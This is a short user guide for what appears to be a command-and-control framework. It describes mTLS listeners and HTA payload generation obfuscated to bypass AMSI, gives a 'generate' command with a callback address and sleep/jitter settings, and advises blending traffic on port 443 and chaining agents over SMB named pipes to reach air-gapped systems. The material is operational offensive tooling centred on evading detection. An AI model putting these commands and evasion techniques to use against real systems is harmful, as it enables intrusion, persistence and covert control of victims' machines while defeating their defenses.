Introduction

Welcome to the documentation. I built this framework to solve a specific problem: keeping C2 traffic secure and hard to fingerprint. By moving away from standard HTTP and using Mutual TLS, we ensure the infrastructure only talks to who it's supposed to.

Listeners

Listeners handle the incoming connections from your agents. Think of them as the "ear" of your server.

[ NOTE: Insert Screenshot of the terminal running 'mtls list' showing active ports here ]

Usage

You can start a listener on any port. If you're doing a real operation, stick to 443 (HTTPS) to blend in.

Command Function
mtls http <ip> <port> Starts a standard HTTP listener.
mtls https <ip> <port> Starts an mTLS encrypted listener (Recommended).

Payload Generation

The generate command creates the initial vector. Currently, the framework focuses on HTAs because they are incredibly effective at bypassing AMSI when obfuscated properly.

Evasion Options

When you generate a payload, don't just use the defaults. Add some noise:

generate 192.168.1.10 443 setup.hta --obfuscate --sleep 60 20

The --sleep flag sets a 60-second callback with a 20% jitter, making your traffic patterns look human and non-periodic.

SMB Links

For air-gapped systems, use the connect command to daisy-chain agents via named pipes. This keeps all traffic internal until it reaches your "Edge" agent.
